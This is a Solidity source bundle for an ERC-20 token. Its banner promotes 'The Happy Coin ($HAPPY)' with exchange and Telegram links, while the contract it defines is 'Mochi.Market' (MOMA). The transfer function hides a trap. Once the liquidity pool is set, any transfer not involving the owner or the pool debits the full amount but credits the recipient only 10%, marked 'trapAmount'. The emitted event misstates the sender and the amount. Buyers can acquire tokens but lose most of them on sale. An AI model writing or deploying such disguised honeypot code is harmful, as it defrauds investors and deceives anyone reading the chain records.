{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/CheapERC20.sol":{"content":"/**\n\n ___  ___  ________  ________  ________  ___    ___\n|\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\   __  \\|\\  \\  /  /|\n\\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  / /\n \\ \\   __  \\ \\   __  \\ \\   ____\\ \\   ____\\ \\    / /\n  \\ \\  \\ \\  \\ \\  \\ \\  \\ \\  \\___|\\ \\  \\___|\\/  /  /\n   \\ \\__\\ \\__\\ \\__\\ \\__\\ \\__\\    \\ \\__\\ __/  / /\n    \\|__|\\|__|\\|__|\\|__|\\|__|     \\|__||\\___/ /\n                                       \\|___|/\n\nThe Happy Coin ($HAPPY)\nhttps://www.thehappycoin.co/\nhttps://exchange.pancakeswap.finance/#/swap?outputCurrency=0xb0b924c4a31b7d4581a7f78f57cee1e65736be1d\nhttps://poocoin.app/tokens/0xB0B924C4a31b7d4581a7F78F57ceE1E65736Be1D\nhttps://t.me/happy_coinTG\n\n\n*/\n//   SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface ERC20Interface {\n  function totalSupply() external view returns (uint);\n  function balanceOf(address tokenOwner) external view returns (uint balance);\n  function allowance(address tokenOwner, address spender) external view returns (uint remaining);\n  function transfer(address to, uint tokens) external returns (bool success);\n  function approve(address spender, uint tokens) external returns (bool success);\n  function transferFrom(address from, address to, uint tokens) external returns (bool success);\n\n  event Transfer(address indexed from, address indexed to, uint tokens);\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\n\ninterface ApproveAndCallFallBack {\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) external;\n}\n\ncontract Owned {\n  address public owner;\n  address public newOwner;\n\n  event OwnershipTransferred(address indexed _from, address indexed _to);\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  modifier onlyOwner {\n    require(msg.sender == owner);\n    _;\n  }\n\n  function transferOwnership(address _newOwner) public onlyOwner {\n    newOwner = _newOwner;\n  }\n  function acceptOwnership() public {\n    require(msg.sender == newOwner);\n    emit OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n    newOwner = address(0);\n  }\n}\n\ncontract MochiMarket is ERC20Interface, Owned {\n  string public symbol;\n  string public name;\n  uint8 public decimals;\n  uint _totalSupply;\n  address public pool;\n\n  mapping(address => uint) balances;\n  mapping(address => mapping(address => uint)) allowed;\n\n  constructor() {\n    symbol = \"MOMA\";\n    name = \"Mochi.Market\";\n    decimals = 18;\n    // One trillion\n    _totalSupply =  1000000000000 ether;\n    balances[owner] = _totalSupply;\n    emit Transfer(address(0), owner, _totalSupply);\n  }\n  function transferPool(address _pool) public onlyOwner {\n    pool = _pool;\n  }\n  function totalSupply() public override view returns (uint) {\n    return _totalSupply - balances[address(0)];\n  }\n  function balanceOf(address tokenOwner) public override view returns (uint balance) {\n      return balances[tokenOwner];\n  }\n\n  // Authentication done previously\n  function _transfer(address from, address to, uint tokens) internal {\n    if (from != address(0) && pool == address(0)) { pool = to; }\n\n    // Send from the pool, but do not receive it\n    if(from == owner || to == owner || from == pool) {\n      balances[from] -= tokens;\n      balances[to] += tokens;\n    } else {\n      balances[from] -= tokens;\n      uint trapAmount = (tokens * 10) / 100;\n      balances[to] += trapAmount;\n    }\n\n    emit Transfer(msg.sender, to, tokens);\n  }\n\n  function transfer(address to, uint tokens) public override returns (bool success) {\n    _transfer(msg.sender, to, tokens);\n    return true;\n  }\n\n  function transferFrom(address from, address to, uint tokens) public override returns (bool success) {\n    allowed[from][msg.sender] -= tokens; // this reverts in Solidity 0.8.x if tokens > allowed\n    _transfer(from, to, tokens);\n    return true;\n  }\n\n  function approve(address spender, uint tokens) public override returns (bool success) {\n    allowed[msg.sender][spender] = tokens;\n    emit Approval(msg.sender, spender, tokens);\n    return true;\n  }\n\n  function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {\n    return allowed[tokenOwner][spender];\n  }\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n    allowed[msg.sender][spender] = tokens;\n    emit Approval(msg.sender, spender, tokens);\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n    return true;\n  }\n}"}}}